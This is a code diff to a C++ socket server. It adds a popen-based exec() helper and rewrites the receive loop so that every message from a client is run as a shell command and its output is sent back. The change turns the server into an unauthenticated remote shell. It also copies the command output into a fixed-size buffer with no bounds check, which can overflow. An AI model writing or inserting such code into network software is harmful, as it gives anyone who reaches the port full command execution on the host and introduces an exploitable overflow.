@@ -8,7 +8,23 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <string.h>
+#include <cstdlib>
+#include <array>
+#include <memory>
 #define MAX_SIZE 1024
+
+std::string exec(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
 
 int getPort(){
     int port;
@@ -148,7 +164,12 @@ int main(int argc, char const *argv[])
                 else{
                     std::cout << valread;
                     buffer[valread] = '\0';
-                    std::cout << buffer << std::endl;
+                    // send(sd , buffer , strlen(buffer) , 0 );
+                    auto returnValue = exec(buffer);
+                    memset(buffer,0,sizeof(buffer));
+                    for(int i = 0; i < returnValue.length(); i++){
+                        buffer[i] = returnValue[i];
+                    }
                     send(sd , buffer , strlen(buffer) , 0 );
                 }
             }
